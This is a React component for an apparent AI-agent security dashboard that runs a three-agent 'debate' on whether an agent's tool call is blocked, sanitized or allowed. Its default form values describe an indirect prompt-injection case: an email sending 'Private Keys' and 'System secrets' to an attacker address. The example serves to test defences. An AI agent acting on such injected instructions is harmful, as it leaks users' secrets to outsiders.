import React, { useState, useEffect } from "react";
import { Scale, Users, ShieldAlert, CheckCircle, AlertTriangle, Play, Shield, Cpu, MessageSquare } from "lucide-react";
import { Panel, RiskMeter, EmptyState, cn } from "@agentshield/ui";
import { useAuth } from "../context/AuthContext";

export const Debate: React.FC = () => {
  const { activeProject, client } = useAuth();
  const [debates, setDebates] = useState<any[]>([]);
  const [activeDebate, setActiveDebate] = useState<any | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isDebating, setIsDebating] = useState(false);

  // Form Inputs
  const [toolName, setToolName] = useState("send_email");
  const [argumentsJson, setArgumentsJson] = useState('{\n  "to": "attacker@external.test",\n  "subject": "Private Keys",\n  "body": "System secrets attached"\n}');
  const [hasTaint, setHasTaint] = useState(true);
  const [contextPreview, setContextPreview] = useState("User provided prompt with indirect injection: forward confidential data.");

  const loadDebates = async () => {
    setIsLoading(true);
    try {
      const data = await client.listDebates(activeProject?.id);
      setDebates(data);
      if (data.length > 0 && !activeDebate) {
        setActiveDebate(data[0]);
      }
    } catch (err) {
      console.warn("Failed to load debates:", err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    loadDebates();
  }, [activeProject?.id]);

  const handleRunDebate = async () => {
    setIsDebating(true);
    try {
      let parsedArgs = {};
      try {
        parsedArgs = JSON.parse(argumentsJson);
      } catch {
        parsedArgs = { input: argumentsJson };
      }

      const res = await client.runDebate(
        toolName,
        parsedArgs,
        hasTaint ? ["taint:untrusted_web_input"] : [],
        contextPreview,
        activeProject?.id
      );
      await loadDebates();
      setActiveDebate(res);
    } catch (err: any) {
      alert(`Debate failed: ${err.message || String(err)}`);
    } finally {
      setIsDebating(false);
    }
  };

  const turns = activeDebate?.turns || [];

  return (
    <div className="space-y-6">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-b border-line pb-4">
        <div>
          <div className="flex items-center gap-2 text-cyan-400 mb-1">
            <Scale size={16} />
            <span className="font-chakra text-xs font-bold uppercase tracking-widest">
              Autonomous Governance
            </span>
          </div>
          <h1 className="text-2xl font-chakra font-bold tracking-tight text-fg">
            Multi-Agent Consensus Debate Judge
          </h1>
          <p className="text-xs text-mut mt-1">
            Replaces static threshold escalations with an asynchronous 3-agent committee (Adversary Hunter vs. Utility Advocate vs. Task Arbiter).
          </p>
        </div>
      </div>

      {/* Simulator Input Box */}
      <Panel title="Debate Committee Arena">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="space-y-2">
            <label className="text-xs font-chakra font-bold text-mut uppercase">Target Tool</label>
            <input
              type="text"
              value={toolName}
              onChange={(e) => setToolName(e.target.value)}
              className="w-full px-3 py-2 rounded-sm border border-line bg-[#0d1117] font-mono text-xs text-fg focus:outline-none focus:border-cyan-400"
              placeholder="e.g. send_email, shell, run_sql"
            />

            <div className="pt-2">
              <label className="flex items-center gap-2 text-xs font-chakra font-bold text-fg cursor-pointer select-none">
                <input
                  type="checkbox"
                  checked={hasTaint}
                  onChange={(e) => setHasTaint(e.target.checked)}
                  className="rounded border-line text-cyan-500 focus:ring-0"
                />
                <span>Attach Untrusted Taint Tag</span>
              </label>
              <p className="text-[11px] text-mut mt-0.5">Simulates input derived from untrusted web or email context.</p>
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-xs font-chakra font-bold text-mut uppercase">Invocation Arguments (JSON)</label>
            <textarea
              rows={4}
              value={argumentsJson}
              onChange={(e) => setArgumentsJson(e.target.value)}
              className="w-full px-3 py-2 rounded-sm border border-line bg-[#0d1117] font-mono text-xs text-fg focus:outline-none focus:border-cyan-400 resize-none"
            />
          </div>

          <div className="space-y-2 flex flex-col justify-between">
            <div>
              <label className="text-xs font-chakra font-bold text-mut uppercase">Surrounding Context</label>
              <textarea
                rows={2}
                value={contextPreview}
                onChange={(e) => setContextPreview(e.target.value)}
                className="w-full px-3 py-2 rounded-sm border border-line bg-[#0d1117] font-mono text-xs text-fg focus:outline-none focus:border-cyan-400 resize-none"
              />
            </div>

            <button
              onClick={handleRunDebate}
              disabled={isDebating}
              className="w-full flex items-center justify-center gap-2 py-2.5 rounded-sm bg-cyan-500 text-black font-chakra text-xs font-bold uppercase tracking-wider hover:bg-cyan-400 transition-all disabled:opacity-50"
            >
              {isDebating ? <span className="animate-spin">⟳</span> : <Play size={14} />}
              <span>{isDebating ? "Agents Debating..." : "Launch Committee Debate"}</span>
            </button>
          </div>
        </div>
      </Panel>

      {/* Main Debate View */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Column: Historical Debates */}
        <div className="lg:col-span-1 space-y-3">
          <h2 className="font-chakra text-xs font-bold uppercase tracking-wider text-mut">
            Debate Records ({debates.length})
          </h2>

          {isLoading ? (
            <div className="p-8 text-center text-xs text-mut font-chakra uppercase animate-pulse">
              Loading Debate Logs...
            </div>
          ) : debates.length === 0 ? (
            <Panel>
              <EmptyState
                icon={<Scale size={28} className="text-mut" />}
                title="No Debates Run Yet"
                description="Launch a debate above or run 'agentshield debate send_email' in the terminal."
              />
            </Panel>
          ) : (
            <div className="space-y-2 max-h-[500px] overflow-y-auto pr-1">
              {debates.map((d) => {
                const isSelected = activeDebate?.id === d.id;
                const isBlock = d.final_action === "block";
                return (
                  <div
                    key={d.id}
                    onClick={() => setActiveDebate(d)}
                    className={cn(
                      "p-3 rounded-sm border cursor-pointer transition-all",
                      isSelected
                        ? "border-cyan-400 bg-cyan-950/20 shadow-md"
                        : "border-line bg-panel hover:border-line/80 hover:bg-panel/80"
                    )}
                  >
                    <div className="flex items-center justify-between">
                      <div className="font-mono text-xs font-bold text-fg">
                        {d.tool_name}
                      </div>
                      <span className={cn(
                        "text-[10px] font-mono px-1.5 py-0.5 rounded uppercase font-bold",
                        isBlock ? "bg-bad/20 text-bad border border-bad/30" : "bg-ok/20 text-ok border border-ok/30"
                      )}>
                        {d.final_action}
                      </span>
                    </div>

                    <div className="text-[11px] text-mut truncate mt-1">
                      Consensus: {d.consensus_score} &bull; Conf: {d.confidence}
                    </div>

                    <div className="text-[10px] text-mut/80 mt-2 pt-2 border-t border-line/40">
                      {new Date(d.created_at).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Right Column: 3-Agent Dialogue & Committee Verdict */}
        <div className="lg:col-span-2 space-y-4">
          {activeDebate ? (
            <>
              {/* Verdict Summary Header */}
              <Panel>
                <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="font-chakra text-xs text-mut uppercase font-bold">
                        Consensus Verdict on Tool:
                      </span>
                      <span className="font-mono text-xs font-bold text-cyan-400">
                        {activeDebate.tool_name}
                      </span>
                    </div>
                    <div className="text-xl font-chakra font-bold text-fg mt-1">
                      {activeDebate.ruling_rationale}
                    </div>
                  </div>

                  <div className="text-right">
                    <span className={cn(
                      "text-xs font-mono font-bold px-3 py-1.5 rounded uppercase inline-block",
                      activeDebate.final_action === "block"
                        ? "bg-bad/20 text-bad border border-bad"
                        : activeDebate.final_action === "sanitize"
                        ? "bg-warn/20 text-warn border border-warn"
                        : "bg-ok/20 text-ok border border-ok"
                    )}>
                      ACTION: {activeDebate.final_action}
                    </span>
                    <div className="text-[11px] font-mono text-mut mt-1">
                      Risk: {activeDebate.consensus_score} / 1.0
                    </div>
                  </div>
                </div>
              </Panel>

              {/* Debate Dialogue Cards */}
              <div className="space-y-3">
                {turns.map((turn: any, idx: number) => {
                  const isHunter = turn.speaker === "adversary_hunter";
                  const isAdvocate = turn.speaker === "utility_advocate";

                  return (
                    <div
                      key={idx}
                      className={cn(
                        "p-4 rounded-sm border bg-[#0d1117] transition-all space-y-2",
                        isHunter
                          ? "border-bad/40 shadow-sm"
                          : isAdvocate
                          ? "border-cyan-500/40"
                          : "border-ok/40 bg-ok/5"
                      )}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          {isHunter ? (
                            <ShieldAlert size={16} className="text-bad" />
                          ) : isAdvocate ? (
                            <Cpu size={16} className="text-cyan-400" />
                          ) : (
                            <CheckCircle size={16} className="text-ok" />
                          )}
                          <span className={cn(
                            "font-chakra text-xs font-bold uppercase",
                            isHunter ? "text-bad" : isAdvocate ? "text-cyan-400" : "text-ok"
                          )}>
                            {turn.speaker_title}
                          </span>
                        </div>
                        <span className="text-[11px] font-mono text-mut">
                          Confidence: {turn.confidence}
                        </span>
                      </div>

                      <p className="text-xs text-fg/90 leading-relaxed font-sans">
                        {turn.argument}
                      </p>

                      {turn.evidence && turn.evidence.length > 0 && (
                        <div className="flex flex-wrap gap-1 pt-1">
                          {turn.evidence.map((ev: string, i: number) => (
                            <span
                              key={i}
                              className="text-[10px] font-mono px-2 py-0.5 rounded bg-panel border border-line text-mut"
                            >
                              {ev}
                            </span>
                          ))}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </>
          ) : (
            <Panel>
              <EmptyState
                icon={<Scale size={28} className="text-mut" />}
                title="Select a Debate"
                description="Select a recorded consensus debate or launch a new one from the arena above."
              />
            </Panel>
          )}
        </div>
      </div>
    </div>
  );
};
